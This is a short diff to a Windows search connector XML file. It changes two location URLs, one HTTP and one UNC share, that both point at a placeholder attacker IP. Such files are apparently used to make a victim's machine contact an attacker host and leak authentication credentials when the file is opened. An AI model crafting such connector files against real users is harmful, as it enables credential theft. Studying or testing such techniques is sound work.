@@ -8,9 +8,9 @@
         <folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
     </templateInfo>
     <simpleLocation>
-        <url>http://{attacker_ip}/</url>
+        <url>http://{attacker_ip}/test1</url>
     </simpleLocation>
     <simpleLocation>
-        <url>\\{attacker_ip}\test</url>
+        <url>\\{attacker_ip}\test2</url>
     </simpleLocation>
 </searchConnectorDescription>
